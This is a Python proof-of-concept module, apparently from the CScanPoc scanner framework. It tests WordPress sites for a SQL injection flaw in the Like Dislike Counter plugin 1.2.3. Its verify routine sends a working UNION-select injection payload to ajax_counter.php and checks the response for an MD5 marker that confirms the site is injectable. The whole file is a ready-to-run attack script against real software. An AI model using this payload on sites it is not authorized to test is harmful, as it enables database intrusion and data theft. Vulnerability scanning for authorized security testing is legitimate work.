# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'WordPress_0069'  # 平台漏洞编号，留空
    name = 'WordPress Like Dislike Counter插件 ajax_counter.php多个SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-09-07'  # 漏洞公布时间
    desc = '''
        WordPress Like Dislike Counter插件 ajax_counter.php多个SQL注入漏洞
    '''  # 漏洞描述
    ref = 'https://www.exploit-db.com/exploits/34553/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'WordPress'  # 漏洞应用名称
    product_version = 'WordPress Like Dislike Counter 1.2.3 '  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '371e351f-6775-4725-b997-4797edeadff1'
    author = '国光'  # POC编写者
    create_date = '2018-05-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }
                    
    def verify(self):
        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            url = arg
            target = url + '/wp-content/plugins/like-dislike-counter-for-posts-pages-and-comments/ajax_counter.php'
            post_data = 'post_id=1/**/and/**/1%3d2/**/union/**/select%20md5(123)%23&up_type=c_like'
            res = requests.post(target, data=post_data)

            if res.status_code == 200 and '202cb962ac59075b964b07152d234b70' in res.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
